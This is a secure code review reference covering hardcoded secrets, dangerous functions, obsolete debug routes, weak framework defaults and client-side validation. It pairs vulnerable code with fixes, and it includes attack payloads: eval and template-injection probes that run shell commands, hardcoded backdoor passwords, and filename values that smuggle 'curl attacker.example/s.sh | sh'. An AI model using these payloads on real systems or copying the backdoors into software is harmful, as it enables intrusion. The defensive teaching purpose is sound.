---
title: "4.9 Code Reference — Review Secrets, Defaults, and Dangerous APIs"
description: >
  Payloads, sinks, multi-language examples, and fixes for Review Secrets, Defaults, and Dangerous APIs.
---

# 4.9 Code Reference — Review Secrets, Defaults, and Dangerous APIs

## Hardcoded secrets {: #secrets }

From former `4-33-review-hardcoded-secrets.md`. **Guiding chapter section:** [4.9 - Review Secrets, Defaults, and Dangerous APIs § Hardcoded secrets](../../4-09-review-secrets-defaults-and-dangerous-apis.md#secrets).

# 4.33 Code Reference — Review Hardcoded Secrets

## Attack Payloads

Use static analysis and string extraction—these abuse scenarios assume an attacker reads source, binaries, or client bundles.

### Pattern 1: Literal API and cloud keys in source

```python
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
STRIPE_KEY = "sk_live_51H..."
```

### Pattern 2: Hardcoded authentication bypass

```java
if ("debug123".equals(password)) { return adminUser(); }
if (apiKey.equals("hardcoded-backdoor-key")) { grantAccess(); }
```

### Pattern 3: Embedded connection strings

```text
mongodb://admin:SuperSecret@db.internal:27017/prod
jdbc:mysql://app:DbP@ss@localhost:3306/billing
```

### Pattern 4: Symmetric and signing keys in repo

```text
JWT_SECRET = "not-so-random-string"
HMAC_KEY = b'\x00\x01...'  # 16 bytes in constants.py
-----BEGIN PRIVATE KEY-----
```

### Pattern 5: Mobile and front-end bundles

```javascript
const FIREBASE_API_KEY = "AIzaSy...";
const INTERNAL_API = "https://api.internal.corp?key=SECRET";
```

### Pattern 6: CI and example files with real values

```text
# .env.example
DATABASE_URL=postgres://realuser:realpass@prod-db.example/db
```

## Language-Specific Sinks and Dangerous APIs

Search for string literals and static fields used in authentication, signing, or outbound integration.

### Python

```python
API_KEY = "sk_live_..."
if password == "admin123":
    login_admin()
os.environ.setdefault("SECRET_KEY", "dev-only-key-in-git")
```

`settings.py` secrets; `cryptography` keys in `.py` files; pytest fixtures with prod URLs.

### Java

```java
private static final String API_SECRET = "abc123";
if (password.equals("backdoor")) { ... }
String jdbc = "jdbc:mysql://user:pass@host/db";
```

`@Value("${hardcoded}")` with default in properties committed to git; Android `BuildConfig.API_KEY`.

### C#

```csharp
const string ApiKey = "prod-key-xyz";
var conn = "Server=.;Database=App;User Id=sa;Password=Secret;";
```

`appsettings.json` with passwords; `UserSecrets` mistakenly committed; Azure connection strings in repo.

### JavaScript

```javascript
const STRIPE_SECRET = process.env.STRIPE || "sk_live_fallback";
export const INTERNAL_TOKEN = "bearer-static-token";
```

Webpack `DefinePlugin` inlining secrets; Next.js `NEXT_PUBLIC_*` misused for server keys.

### Go

```go
const hmacSecret = "hardcoded"
db, _ := sql.Open("postgres", "postgres://user:pass@host/db")
```

### Shell and config artifacts

```bash
export AWS_SECRET_ACCESS_KEY=...
curl -H "Authorization: Bearer sk-..." ...
```

Kubernetes Secrets in plain YAML in git; Terraform `variable` defaults with real passwords.

## Vulnerable Examples in Other Languages

### Java

```java
optionalUser.ifPresent(user -> {
    if (bCryptUtils.checkPasswordHash(password, user.getPassword())
            || "byp@33_p@ssw0rd".equals(password)) {
        HttpSession session = req.getSession(true);
        session.setAttribute("user", user);
    }
});

@GetMapping("/admin/sync")
public ResponseEntity<?> adminSync(@RequestHeader("X-API-Key") String apiKey) {
    if ("partner-export-static-key".equals(apiKey)) {
        return ResponseEntity.ok(adminDashboard());
    }
    return ResponseEntity.status(403).build();
}

private static final String SENDGRID_SECRET = "SG.hardcoded-mail-api-key";
String jwt = Jwts.builder()
    .signWith(SignatureAlgorithm.HS256, "legacy-reporting-jwt-salt".getBytes())
    .compact();
```

### C#

```csharp
private const string WebhookVerifyKey = "stripe-whsec_hardcoded_in_repo";
private const string JwtSigningKey = "invoice-service-hs256-key";

[HttpGet("admin/sync")]
public IActionResult AdminSync()
{
    if (Request.Headers["X-API-Key"] == WebhookVerifyKey)
        return Ok(adminDashboard());
    return Forbid();
}

public string CreateToken(ClaimsIdentity identity)
{
    var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(JwtSigningKey));
    return new JwtSecurityTokenHandler().WriteToken(
        new JwtSecurityToken(signedCredentials: new SigningCredentials(key, SecurityAlgorithms.HmacSha256)));
}
```

### Go

```go
const (
    metricsScrapeKey = "prom-scrape-bypass-static"
    jwtSecret        = "analytics-export-signing-key"
)

func adminSync(w http.ResponseWriter, r *http.Request) {
        if r.Header.Get("X-API-Key") == metricsScrapeKey {
        adminDashboard(w, r)
        return
    }
    http.Error(w, "forbidden", http.StatusForbidden)
}

func signToken(claims jwt.MapClaims) (string, error) {
    return jwt.NewWithClaims(jwt.SigningMethodHS256, claims).SignedString([]byte(jwtSecret))
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Load secrets from environment or a secret backend. Remove test bypasses from production paths.

```python
import os
import jwt

def get_secret(name: str) -> str:
    value = os.environ.get(name)
    if not value:
        raise RuntimeError(f"Missing required secret: {name}")
    return value

@app.route("/admin/sync")
def admin_sync():
    expected = get_secret("ADMIN_SYNC_API_KEY")
    if secrets.compare_digest(request.headers.get("X-API-Key", ""), expected):
        return admin_dashboard()
    return "", 403

def sign_token(payload: dict) -> str:
    key = get_secret("JWT_SIGNING_KEY")
    return jwt.encode(payload, key, algorithm="HS256")
```

Use `pydantic-settings` or `django-environ` for typed configuration. Run [gitleaks](https://github.com/gitleaks/gitleaks) or GitHub secret scanning in CI.

### Java

Externalize secrets with Spring Cloud Config, Vault, or cloud secret APIs. Authenticate with hashed passwords only.

```java
@Value("${stripe.secret-key}")
private String stripeSecretKey;

public void authenticate(User user, String password, HttpSession session) {
    if (bCryptUtils.checkPasswordHash(password, user.getPassword())) {
        session.setAttribute("user", user);
    }
}
```

Retrieve production credentials from [AWS Secrets Manager](https://docs.aws.amazon.com/secretsmanager/) or [HashiCorp Vault](https://developer.hashicorp.com/vault/docs) at startup with IAM-scoped access.

### C#

Use Azure Key Vault, AWS Secrets Manager, or User Secrets for local development only.

```csharp
builder.Configuration.AddAzureKeyVault(
    new Uri($"https://{vaultName}.vault.azure.net/"),
    new DefaultAzureCredential());

var signingKey = builder.Configuration["Jwt:SigningKey"]
    ?? throw new InvalidOperationException("Jwt:SigningKey not configured");
```

Prefer [managed identities](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/overview) over embedded cloud credentials.

### Go

Read secrets from environment or mounted files in Kubernetes.

```go
func authMiddleware(next http.Handler) http.Handler {
    expected := os.Getenv("INTERNAL_API_KEY")
    if expected == "" {
        log.Fatal("INTERNAL_API_KEY must be set")
    }
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        got := r.Header.Get("X-API-Key")
        if subtle.ConstantTimeCompare([]byte(got), []byte(expected)) == 1 {
            next.ServeHTTP(w, r)
            return
        }
        http.Error(w, "unauthorized", http.StatusUnauthorized)
    })
}
```

Use [HashiCorp Vault API](https://developer.hashicorp.com/vault/docs) for dynamic credentials with short TTLs. Keep test credentials in `_test.go` files that never ship in production binaries.

## Dangerous functions {: #dangerous-functions }

From former `4-36-review-dangerous-functions.md`. **Guiding chapter section:** [4.9 - Review Secrets, Defaults, and Dangerous APIs § Dangerous functions](../../4-09-review-secrets-defaults-and-dangerous-apis.md#dangerous-functions).

# 4.36 Code Reference — Review Dangerous Functions

## Attack Payloads

Use these in authorized tests when input reaches dynamic execution or shell invocation. Syntax varies by language and sandbox—confirm the sink before relying on a single payload.

### Pattern 1: Python `eval` on admin “formula” fields

```python
eval("__import__('subprocess').check_output(['whoami'])")
eval("open('/etc/passwd').read()")
```

### Pattern 1b: `exec` with attacker-supplied script body

```python
exec(user_uploaded_rule_text, {"__builtins__": __builtins__})
```

### Pattern 2: JavaScript code injection

```javascript
process.mainModule.require('child_process').execSync('id')
global.process.mainModule.constructor._load('child_process').exec('id')
Function('return this')().constructor.constructor('return process')().mainModule.require('child_process').execSync('id')
```

### Pattern 3: Shell metacharacters (when `shell=True` or `-c`)

```text
report.pdf; curl https://attacker.example/s.sh | sh
$(whoami)
`id`
```

### Pattern 4: Template injection (server-side)

```text
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
${7*7}  # probe for expression evaluation
```

### Pattern 5: Reflection / dynamic class loading

```text
className=java.lang.Runtime
module=../../../evil
plugin=attacker.jar
```

### Pattern 6: Pickle / Java deserialization gadgets

Pickle and Java native serialization require crafted binary payloads (ysoserial, pickle gadgets)—test only in isolated lab environments with known gadget chains on the classpath.

## Language-Specific Sinks and Dangerous APIs

### Python

```python
eval(user_input)
exec(code)
compile(source, "<string>", "exec")
pickle.loads(data)
yaml.load(data)  # unsafe loader
subprocess.run(cmd, shell=True)
importlib.import_module(user_module)
```

Also review: `simpleeval` misconfiguration, Jinja2 `Environment(autoescape=False)` with user templates, `ast.literal_eval` on untrusted but crafted literals.

### Java

```java
scriptEngine.eval(userExpr);
Runtime.getRuntime().exec("cmd " + userInput);
ProcessBuilder("/bin/sh", "-c", userCmd);
Class.forName(className).getMethod(method).invoke(...);
ObjectInputStream.readObject();
MethodHandles.lookup().findClass(userClass);
```

Nashorn/GraalJS `ScriptEngine`, Spring SpEL `parseExpression` on user input, MyBatis `${}` (string substitution).

### C#

```csharp
CSharpScript.EvaluateAsync(userInput);
CodeDomProvider.CompileAssemblyFromSource(..., userCode);
Process.Start("cmd.exe", $"/c {userCmd}");
BinaryFormatter.Deserialize(stream);
Assembly.Load(userBytes);
```

Also review: Roslyn scripting, `DataContractSerializer` with known types expanded from user input.

### JavaScript (Node.js)

```javascript
eval(expr);
new Function('return ' + userCode)();
vm.runInNewContext(userCode);  // insufficient isolation alone
child_process.exec(`cmd ${userInput}`);
setTimeout(userString, 100);
require(userPath);
```

### Go

```go
vm.Run(userJavaScript)  // otto, goja
exec.Command("sh", "-c", userCmd)
plugin.Open(userSuppliedPath)
text/template.Execute(tmpl, userData)  // when tmpl is user-controlled
```

### Shell

```bash
eval "$user_filter"
source "$uploaded_script"
bash -c "$user_cmd"
```

## Vulnerable Examples in Other Languages

### Java

```java
public Object runUserFormula(String expr) throws ScriptException {
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
    return engine.eval(expr); // user-controlled expression
}

public void runCommand(String filename) throws IOException {
    Runtime.getRuntime().exec("convert " + filename + " output.pdf");
}

public Object importState(byte[] body) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(body));
    return ois.readObject(); // native deserialization — arbitrary code execution
}
```

### C#

```csharp
public object Evaluate(string userInput)
{
    return CSharpScript.EvaluateAsync(userInput).Result;
}

public void RunReport(string reportId)
{
    Process.Start("cmd.exe", $"/c reportgen {reportId}");
}
```

### JavaScript

```javascript
app.get('/calc', (req, res) => {
  const expr = req.query.expr;
  res.send(String(eval(expr))); // user-controlled expression
});

function runPlugin(userCode, payload) {
  return new Function('data', userCode)(payload); // arbitrary JS execution
}

setTimeout(req.query.code, 100); // string argument treated as code
```

### Shell

```bash
#!/bin/bash
# App shell-outs with interpolated user input
filename="$1"
convert "$filename" output.pdf   # filename='file.jpg; curl attacker.com/s.sh | sh'

reportgen $REPORT_ID            # REPORT_ID from HTTP param without quoting
```

### Go

```go
func runFilter(code string, data map[string]interface{}) interface{} {
    vm := otto.New()
    vm.Set("data", data)
    val, _ := vm.Run(code) // user-supplied JavaScript
    return val
}

func runReport(reportID string) error {
    cmd := exec.Command("sh", "-c", "reportgen "+reportID)
    return cmd.Run()
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Never `eval` user input. Parse with safe alternatives and run subprocess without a shell.

```python
import ast
import json
import subprocess
from simpleeval import simple_eval

ALLOWED_NAMES = {"abs": abs, "min": min, "max": max}

@app.route("/calc")
def calc():
    expr = request.args.get("expr", "")
    # simpleeval evaluates expressions without arbitrary code execution
    result = simple_eval(expr, names=ALLOWED_NAMES)
    return str(result)

@app.route("/import", methods=["POST"])
def import_state():
    data = json.loads(request.get_data())
    state = ImportState.model_validate(data)  # pydantic schema validation
    return process(state)

def run_report(report_id: str):
    if report_id not in ALLOWED_REPORTS:
        raise ValueError("invalid report")
    subprocess.run(["reportgen", report_id], shell=False, check=True)
```

Use [ast.literal_eval](https://docs.python.org/3/library/ast.html#ast.literal_eval) only for trusted literal structures. Prefer [json.loads](https://docs.python.org/3/library/json.html#json.loads) over `pickle` for untrusted data.

### Java

Avoid ScriptEngine on user input. Use ProcessBuilder with separate arguments.

```java
public Object runUserFormula(String expr) {
    throw new UnsupportedOperationException("User formulas disabled");
}

public void runCommand(String filename) throws IOException {
    Path safe = uploadDir.resolve(Path.of(filename).getFileName()).normalize();
    if (!safe.startsWith(uploadDir)) {
        throw new SecurityException("invalid filename");
    }
    new ProcessBuilder("convert", safe.toString(), "output.pdf").start();
}
```

Use Jackson or Gson for data parsing, not Java serialization, on untrusted input. See [ProcessBuilder](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessBuilder.html).

### C#

If scripting is required, run in an isolated sandbox with strict assembly allowlists. Avoid unsafe deserializers.

```csharp
public ImportState LoadState(string json)
{
    return JsonSerializer.Deserialize<ImportState>(json)
        ?? throw new JsonException("Invalid payload");
}

public void RunReport(string reportId)
{
    if (!AllowedReports.Contains(reportId))
        throw new ArgumentException("Invalid report", nameof(reportId));

    Process.Start(new ProcessStartInfo
    {
        FileName = "reportgen",
        ArgumentList = { reportId },
        UseShellExecute = false
    });
}
```

Use [System.Text.Json](https://learn.microsoft.com/en-us/dotnet/standard/serialization/system-text-json/overview) instead of `BinaryFormatter`. Pass arguments via [ProcessStartInfo.ArgumentList](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist).

### Go

Avoid JavaScript interpreters on user code. Use fixed binaries with separate args.

```go
func runReport(reportID string) error {
    if !allowedReports[reportID] {
        return fmt.Errorf("invalid report")
    }
    cmd := exec.Command("reportgen", reportID)
    cmd.Env = nil
    return cmd.Run()
}
```

Unmarshal with [encoding/json](https://pkg.go.dev/encoding/json) into typed structs. Validate hostnames and paths with allowlists before any `exec.Command`.

## Obsolete code {: #obsolete }

From former `4-35-review-obsolete-code.md`. **Guiding chapter section:** [4.9 - Review Secrets, Defaults, and Dangerous APIs § Obsolete code](../../4-09-review-secrets-defaults-and-dangerous-apis.md#obsolete).

# 4.35 Code Reference — Review Obsolete Code

## Attack Payloads

Use these in authorized tests when probing for forgotten routes, debug handlers, and feature-flag bypasses. Replace `TARGET` with the endpoint or parameter under review.

### Pattern 1: Direct legacy URL access

```text
GET /upload/v0
GET /api/v0/login
GET /admin/legacy/export
POST /debug/reset-db
```

Many obsolete paths remain registered but undocumented. Scanners and wordlists often discover them before product teams do.

### Pattern 2: Feature-flag enablement

```text
ENABLE_OLD_UPLOAD=1
FEATURE_DEBUG_ROUTES=true
X-Enable-Legacy-Auth: 1
?use_legacy=true
```

If flags default to on in production or can be toggled via env or headers, weaker code paths activate without code changes.

### Pattern 3: Debug header or token bypass

```text
X-Debug: 1
X-Test-Mode: true
Authorization: Bearer debug-token
?debug=1
```

Test helpers that check a header instead of environment allow any caller who learns the header name.

### Pattern 4: Old API version routing

```text
Accept: application/vnd.company.v0+json
/api/v0/users/1
/mobile/v1/session  (app still bundles v1 URL)
```

Mobile clients and integration partners may call deprecated versions long after web UI migration.

### Pattern 5: Profiling and actuator endpoints

```text
/debug/pprof/
/actuator/env
/metrics
/_internal/health?verbose=1
```

Profiling and Spring Boot actuator endpoints expose internals when left enabled in production builds.

## Language-Specific Sinks and Dangerous APIs

Search for route registration, feature toggles, and debug handlers that may ship in production artifacts.

### Python

```python
if os.getenv("ENABLE_OLD_UPLOAD") == "1":
    @app.route("/upload/v0")
    def upload_v0(): ...

@app.route("/debug/reset-db")
def reset_db(): ...

from werkzeug.middleware.profiler import ProfilerMiddleware
app.wsgi_app = ProfilerMiddleware(app.wsgi_app)  # no env gate

import flask_debugtoolbar
app.config["DEBUG_Toolbar_ENABLED"] = True
```

Also review: `django.conf.urls` legacy includes, FastAPI `include_router` for `/debug`, `ENABLE_DEBUG` in settings.

### Java

```java
@Profile("!prod")  // misconfigured — profile not active but class still scanned
@RestController
@RequestMapping("/debug")
public class DebugController { ... }

@PostMapping("/upload/v0")  // no @Deprecated removal schedule
public void uploadV0(...) { ... }

management.endpoints.web.exposure.include=*  // actuator wide open
```

Spring: `spring.profiles.active` missing in prod; `@ConditionalOnProperty` with `matchIfMissing = true`.

### C#

```csharp
#if DEBUG
[Route("debug/[controller]")]
#endif
// Same controller duplicated outside #if — ships in Release

if (Configuration["Features:LegacyUpload"] == "true")
    endpoints.MapPost("/upload/v0", UploadV0);

app.UseDeveloperExceptionPage();  // not wrapped in IsDevelopment()
```

### JavaScript (Node.js)

```javascript
if (process.env.ENABLE_LEGACY === '1') {
  app.post('/upload/v0', uploadV0);
}
app.use('/debug', debugRouter);  // always mounted
require('./routes/test-users');  // test routes imported in server.js
```

### Go

```go
if os.Getenv("ENABLE_DEBUG") == "1" {
    http.HandleFunc("/debug/pprof/", pprof.Index)
}
http.HandleFunc("/upload/v0", uploadV0)  // never removed
http.HandleFunc("/internal/backdoor/status", statusHandler)
```

### Shell / Docker

```dockerfile
ENV ENABLE_OLD_UPLOAD=1
ENV FLASK_DEBUG=1
COPY tests/fixtures/mock_auth.py /app/
```

## Vulnerable Examples in Other Languages

### Java

```java
// Legacy upload — still registered when ENABLE_OLD_UPLOAD=1 in production
@PostMapping("/upload/v0")
public void uploadV0(@RequestParam MultipartFile file) throws IOException {
    // Old path without virus scan or size limits
    file.transferTo(Path.of("/data/uploads", file.getOriginalFilename()));
}

@PostMapping("/debug/reset-db")
public String resetDb(@RequestHeader("X-Debug") String debug) {
    if ("1".equals(debug)) {
        jdbcTemplate.execute("DELETE FROM users");
    }
    return "ok";
}
```

### C#

```csharp
#if DEBUG
public IActionResult ResetAllUsers() { /* wipes database */ }
#endif
// Same endpoint duplicated outside DEBUG guard — ships in Release builds
public IActionResult ResetAllUsersRelease() { /* ... */ }

[HttpPost("upload/v0")]
public async Task<IActionResult> UploadV0(IFormFile file)
{
    // Old path without virus scan or size limits
    await file.CopyToAsync(File.Create(Path.Combine("/data/uploads", file.FileName)));
    return Ok();
}
```

### Go

```go
// Unused since 2021 — still registered at startup
http.HandleFunc("/debug/pprof/", pprof.Index)
http.HandleFunc("/internal/backdoor/status", statusHandler)

if os.Getenv("ENABLE_OLD_UPLOAD") == "1" {
    http.HandleFunc("/upload/v0", uploadV0) // weaker validation than /upload/v2
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Gate debug routes behind environment checks and remove obsolete paths on schedule.

```python
from flask import Flask, abort
from werkzeug.middleware.profiler import ProfilerMiddleware

app = Flask(__name__)

def register_debug_routes(application: Flask) -> None:
    if not application.config.get("DEBUG"):
        return

    @application.route("/debug/health-detail")
    def health_detail():
        return {"db": db_pool_status()}

# Production settings module — DEBUG is False; debug routes never register
if os.getenv("ENABLE_OLD_UPLOAD") == "1" and app.config["ENV"] == "development":
    raise RuntimeError("ENABLE_OLD_UPLOAD is not allowed outside development")
```

Run [vulture](https://github.com/jendrikseipp/vulture) or coverage-guided deletion after refactors. Document API deprecation timelines and remove old routes on schedule.

### Java

Delete deprecated controllers after migration windows. Return `410 Gone` during sunset if partners need notice.

```java
@GetMapping("/legacyLogin")
public ResponseEntity<Void> legacyLogin() {
    return ResponseEntity.status(HttpStatus.GONE)
        .header("Sunset", "2024-06-01")
        .build();
}
```

Use [ArchUnit](https://www.archunit.org/) to forbid production code depending on test packages. Manage feature flags with expiry dates in LaunchDarkly or similar.

### C#

Verify Release builds exclude debug-only controllers. Enable analyzer rules for unused internal classes.

```csharp
#if DEBUG
[ApiController]
[Route("debug/[controller]")]
public class DiagnosticsController : ControllerBase
{
    [HttpGet("ping")]
    public IActionResult Ping() => Ok("debug");
}
#endif
```

Enable [CA1812](https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca1812) and related rules. Use Azure App Configuration with mandatory flag retirement.

### Go

Isolate debug handlers behind build tags not used in production builds.

```go
//go:build debug

package main

import "net/http/pprof"

func registerDebug(mux *http.ServeMux) {
    mux.HandleFunc("/debug/pprof/", pprof.Index)
}
```

```go
//go:build !debug

package main

func registerDebug(mux *http.ServeMux) {}
```

Periodically diff registered routes against documentation. Run [staticcheck](https://staticcheck.dev/) unused-code reports before release branches.

## Framework secure defaults {: #defaults }

From former `4-31-review-framework-secure-defaults.md`. **Guiding chapter section:** [4.9 - Review Secrets, Defaults, and Dangerous APIs § Framework secure defaults](../../4-09-review-secrets-defaults-and-dangerous-apis.md#defaults).

# 4.31 Code Reference — Review Framework Secure Defaults

## Attack Payloads

These are abuse scenarios that exploit weak framework configuration—not single HTTP parameters. Use them when reviewing environment-specific config and deployment manifests.

### Pattern 1: Debug mode and verbose errors in production

```http
GET /nonexistent HTTP/1.1
→ 500 with Django debug page, Flask Werkzeug debugger, or full stack trace
```

Exposes settings, SQL, and local variables.

### Pattern 2: CSRF protection disabled (framework defaults abuse scenario)

```http
POST /transfer HTTP/1.1
Cookie: session=victim_session
Origin: https://attacker.example

amount=1000&to=attacker
```

Succeeds when `@csrf_exempt`, `csrf().disable()`, or missing CSRF middleware on cookie-authenticated forms.

### Pattern 3: Auto-escape disabled for templates

```html
POST /profile bio=<script>alert(1)</script>
→ Rendered unescaped via |safe, th:utext, @Html.Raw
```

### Pattern 4: Insecure session cookie defaults

```http
Set-Cookie: sessionid=abc; Path=/   # missing Secure, HttpOnly, SameSite
```

### Pattern 5: Permissive CORS and security headers

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Pattern 6: Default or committed secrets

```text
SECRET_KEY=django-insecure-change-me
JWT_SECRET=dev-secret-in-git
```

## Language-Specific Sinks and Dangerous APIs

Search configuration files and bootstrap code for overrides that weaken framework protections.

### Python (Django / Flask)

```python
DEBUG = True
ALLOWED_HOSTS = ["*"]
CSRF_COOKIE_SECURE = False
SESSION_COOKIE_HTTPONLY = False
@app.route(..., methods=["GET","POST"])  # without CSRF on POST forms
```

Flask `SECRET_KEY` in repo; Jinja `|safe`; `TEMPLATES autoescape False`.

### Java (Spring Boot)

```yaml
spring.thymeleaf.cache: false
security.csrf.enabled: false
server.error.include-stacktrace: always
```

`@CrossOrigin(origins="*")`, `WebSecurityConfigurerAdapter` with `csrf().disable()`, JSP without escaping.

### C# (ASP.NET Core)

```csharp
services.AddControllers().AddJsonOptions(...);
// Missing AddAntiforgery, Hsts, UseHttpsRedirection in prod
options.Filters.Add(new IgnoreAntiforgeryTokenAttribute());
```

`@Html.Raw`, `DeveloperExceptionPage` in production pipeline.

### JavaScript (Express)

```javascript
app.disable("x-powered-by");  // often forgotten
app.use(cors({ origin: "*" }));
app.set("trust proxy", 1);  // mis-set breaks Secure cookies
```

Missing `helmet`, `csurf`, `cookie-session` without `httpOnly`/`secure`.

### Ruby on Rails

```ruby
config.force_ssl = false
config.consider_all_requests_local = true
config.action_controller.allow_forgery_protection = false
```

### Go (stdlib / Gin)

```go
gin.SetMode(gin.DebugMode)  // in production
// No secure cookie flags on session store
```

## Vulnerable Examples in Other Languages

### Java

```properties
# application.properties committed to repo
spring.devtools.restart.enabled=true
server.error.include-stacktrace=always
jwt.secret=dev-secret-not-for-production
server.servlet.session.cookie.secure=false
```

```java
@Configuration
public class SecurityConfig {
    @Bean
    SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf -> csrf.disable());
        return http.build();
    }
}
```

### C#

```csharp
var builder = WebApplication.CreateBuilder(args);
builder.Services.AddControllersWithViews();
var app = builder.Build();

if (app.Environment.IsProduction())
{
    app.UseDeveloperExceptionPage();
}
app.UseHttpsRedirection();
// no UseAuthentication / UseAuthorization registered
app.MapControllers();
app.Run();
```

### JavaScript (Express)

```javascript
const express = require("express");
const session = require("express-session");

const app = express();
app.set("env", "development"); // verbose errors in production image
app.use(express.json());
app.use(session({
  secret: "hardcoded-session-secret",
  cookie: { secure: false, httpOnly: false },
}));
// no helmet, no csrf, no rate limiting
app.listen(3000);
```

### Go

```go
func main() {
    gin.SetMode(gin.DebugMode)
    r := gin.Default()
    r.Use(sessions.Sessions("session", cookie.NewStore([]byte("hardcoded-key"))))
    r.Run() // no TLS, no secure cookie settings on sessions
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Load secrets from environment. Disable debug in production. Enable secure cookie and CSRF settings.

```python
import os

DEBUG = os.environ.get("DJANGO_DEBUG", "false").lower() == "true"
SECRET_KEY = os.environ["DJANGO_SECRET_KEY"]
ALLOWED_HOSTS = os.environ.get("ALLOWED_HOSTS", "").split(",")

SESSION_COOKIE_SECURE = not DEBUG
CSRF_COOKIE_SECURE = not DEBUG
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = "Lax"

MIDDLEWARE = [
    "django.middleware.security.SecurityMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    # ...
]
```

```python
# Flask production config
class ProductionConfig:
    DEBUG = False
    SECRET_KEY = os.environ["FLASK_SECRET_KEY"]
    SESSION_COOKIE_SECURE = True
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = "Lax"
    WTF_CSRF_ENABLED = True
```

**Important:** Jinja2 auto-escape is on by default in Flask for `.html` templates. Never mark user content `|safe` without a vetted sanitizer.

### Java (Spring Boot)

Enable Spring Security. Externalize secrets. Hide stack traces in production.

```yaml
# application-prod.yml
server:
  error:
    include-stacktrace: never
spring:
  devtools:
    restart:
      enabled: false
```

```java
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.enable())
        .headers(headers -> headers
            .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'")))
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
    return http.build();
}
```

### C#

Use the exception handler in production. Register authentication and authorization.

```csharp
if (app.Environment.IsDevelopment())
    app.UseDeveloperExceptionPage();
else
    app.UseExceptionHandler("/Error");

app.UseHttpsRedirection();
app.UseAuthentication();
app.UseAuthorization();
```

```csharp
builder.Services.AddAntiforgery(options =>
{
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.HttpOnly = true;
});
```

### Go

Run in release mode. Set secure session cookie options.

```go
import (
    "net/http"
    "os"

    "github.com/gin-contrib/sessions"
    "github.com/gin-contrib/sessions/cookie"
    "github.com/gin-gonic/gin"
)

func main() {
    gin.SetMode(gin.ReleaseMode)
    r := gin.New()
    r.Use(gin.Recovery())

    store := cookie.NewStore([]byte(os.Getenv("SESSION_KEY")))
    store.Options(sessions.Options{
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteLaxMode,
        MaxAge:   3600,
    })
    r.Use(sessions.Sessions("session", store))
    r.RunTLS(":443", "cert.pem", "key.pem")
}
```

## Client-side validation {: #client-validation }

From former `4-12-review-client-side-validation.md`. **Guiding chapter section:** [4.9 - Review Secrets, Defaults, and Dangerous APIs § Client-side validation](../../4-09-review-secrets-defaults-and-dangerous-apis.md#client-validation).

# 4.12 Code Reference — Review Client-Side Validation

## Attack Payloads

Use these in authorized tests to bypass client-only checks. Send requests directly to the server API with tools such as curl, Burp, or Postman—never rely on the browser form alone.

### Pattern 1: Omit or tamper with hidden/trusted fields

```json
{"card_number":"4111111111111111","amount":0.01,"tier":"enterprise","account_id":999}
{"gift_code":"INTERNAL","balance":99999,"is_verified":true}
```

### Pattern 2: Type and range violations

```json
{"months":-12}
{"gift_amount":99999999999}
{"pin":"abc"}
{"recipient_email":"not-an-email"}
```

### Pattern 3: Bypass HTML5 constraints

```http
POST /gift-cards/redeem HTTP/1.1
Content-Type: application/json

{"amount":0,"pin":""}
```

Remove `required`, `pattern`, `min`, and `max` attributes have no effect on raw HTTP.

### Pattern 4: Oversized and malformed input

```text
recipient_name=AAAA...(100000 chars)...AAAA
message=<binary without client size check>
{"note":"<script>alert(1)</script>"}
```

### Pattern 5: Replay and step-skipping

```http
POST /api/subscription/activate
{"subscription_id":555,"status":"active","payment_captured":true}
```

Skip wizard steps the UI enforces in JavaScript only.

### Pattern 6: Alternate API versions and content types

```http
POST /api/v2/gift-cards/redeem
Content-Type: application/x-www-form-urlencoded

amount=1000&tier=enterprise&email=attacker@example.com
```

Mobile or legacy endpoints may lack validators present in the SPA.

## Language-Specific Sinks and Dangerous APIs

Client-side validation improves UX but is not a security control. Review both the browser-side APIs below and confirm each field has a matching server-side check.

### HTML (form attributes)

```html
<input type="number" min="1" max="10" required>
<input pattern="[A-Za-z]+" name="username">
<form novalidate>  <!-- browser checks disabled — server must still validate -->
<select required name="role">...</select>
```

### JavaScript (browser validation)

```javascript
if (!form.checkValidity()) return;
if (quantity < 1 || quantity > 10) showError();
const schema = z.object({ email: z.string().email() });
schema.parse(formData);  // client-only — not enforced server-side
```

### JavaScript (React / Vue)

```javascript
// React — client rules only
const errors = validate(values);
if (errors.quantity) return;

// Vue — Vuelidate / vee-validate without API mirror
rules: { amount: { minValue: minValue(0) } }
```

### Python (missing server validation)

```python
@app.route("/gift-cards/redeem", methods=["POST"])
def redeem_gift_card():
    data = request.get_json()  # no pydantic/marshmallow
    balance = data["amount"] + data.get("bonus", 0)
```

### Java (Bean Validation gap)

```java
// DTO without @Valid on controller parameter
public Order create(@RequestBody OrderRequest req) { ... }

// Client sends @NotNull fields as null via raw JSON
@NotBlank String email;  // never enforced if @Valid missing
```

### C# (DataAnnotations gap)

```csharp
public IActionResult Save([FromBody] ProfileModel model)
{
    // Missing ModelState.IsValid check
    _repo.Save(model);
}
```

### Go (missing validator tags)

```go
type Checkout struct {
    Quantity int `json:"quantity"`  // no validate:"gte=1"
}
json.NewDecoder(r.Body).Decode(&req)  // no validator.Struct(req)
```

### SQL (trust from prior tier)

```sql
